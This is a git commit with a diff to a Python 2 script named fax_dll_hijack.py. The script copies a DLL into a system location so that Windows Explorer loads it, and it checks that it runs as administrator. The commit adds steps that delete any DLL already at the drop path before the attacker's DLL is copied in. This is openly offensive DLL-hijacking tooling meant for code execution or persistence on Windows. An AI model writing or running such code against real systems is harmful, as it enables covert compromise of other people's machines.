95815fb462c4a9e95409488461114a118c96d07a
rootm0s <rickardmalmkvist@hotmail.com>
2018-05-02 23:22:06 +0200

    Update fax_dll_hijack.py

--- fax_dll_hijack.py
+++ fax_dll_hijack.py
@@ -27,6 +27,15 @@ def fax_dll_hijack():
 	print " {} fax_dll_hijack: Attempting to copy: {} to: {} in order to dll hijack explorer".format(infoBox(),dll_name,dll_drop)
 	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
 		print " {} fax_dll_hijack: We are running as admin, we can proceed".format(infoBox())
+		
+		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):
+			try:
+				os.remove(os.path.join(dll_drop,dll_name))
+				print " {} fax_dll_hijack: Successfully removed: {} from: {}".format(successBox(),dll_name,dll_drop)
+			except Exception as error:
+				print " {} fax_dll_hijack: Unable to remove: {} from: {}".format(errorBox(),dll_name,dll_drop)
+				return False
+
 		try:
 			shutil.copy(dll_name,dll_drop)
 			print " {} fax_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,dll_drop)
@@ -38,4 +47,4 @@ def fax_dll_hijack():
 			return False
 	else:
 		print " {} fax_dll_hijack: We are not admin, cannot proceed".format(errorBox())
-		return False
+		return False		
